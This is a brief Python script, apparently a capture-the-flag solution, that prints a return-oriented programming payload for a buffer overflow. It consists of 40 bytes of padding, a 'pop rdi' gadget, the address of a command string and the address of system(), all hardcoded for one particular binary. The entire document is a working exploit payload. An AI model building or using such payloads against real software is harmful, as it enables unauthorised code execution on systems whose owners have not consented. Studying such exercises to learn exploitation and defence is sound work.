import struct

pattern    = "A"*40                             #40 size of pattern to crash
pop_gadget = "\xc3\x07\x40\x00\x00\x00\x00\x00" #pop rdi as paramter to system
bin_cat    = "\x60\x10\x60\x00\x00\x00\x00\x00" #command to be pop from the RSP to RDI
system     = "\x60\x05\x40\x00\x00\x00\x00\x00" #system with RDI as parameter 

print(pattern+pop_gadget+bin_cat+system)